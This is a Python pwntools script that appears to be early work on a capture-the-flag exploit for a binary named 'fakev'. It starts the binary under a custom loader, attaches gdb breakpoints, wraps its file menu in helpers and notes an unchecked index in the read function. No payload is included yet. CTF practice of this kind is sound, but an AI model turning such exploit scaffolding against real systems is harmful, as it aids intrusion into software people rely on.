from pwn import *
envi={"LD_PRELOAD":'./libc-2.27.so'}
target=process(["/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so",'./fakev'],env=envi)
#target=remote('challs.m0lecon.it',9013)
context.terminal=["tmux","split","-h"]
gdb.attach(target,'''break *0x4010b4 
		     break*0x400DEC 
			break *0x400F01
			break *0x400E84
			break *0x4010EE ''')

#get fileindex(1-9), sprintf(&b2,"%d.txt",fileindex), fopen(&b2,"r"), check FS, call add(FS),  
#in add(FS), 
FS_array=0x602248
def open_file(index):
	print(target.recvuntil("Choice: "))
	target.sendline("1")
	print(target.recvline)
	target.sendline(str(index))		

content_array=0x602200
#get index, sub1, check null at index of content_array,  write to stdout 0xf0 bytes at index of content_array
#no check on index
def read_content(index):
	print(target.recvuntil("Choice: "))
	target.sendline("2")
	print(target.recvuntil("Index: "))
	target.sendline(str(index))
	print(target.recvline())

#puts(text), call exit(1) 
def write_content():
	print(target.recvuntil("Choice: "))
	target.sendline("3")
	print(target.recvline())

def close_file():
	print(target.recvuntil("Choice: "))
	target.sendline("4")

def cycle(index):
	open_file(index)
	read_content(1)
	close_file()

for i in range(1,10):
	open_file(i)

target.interactive()
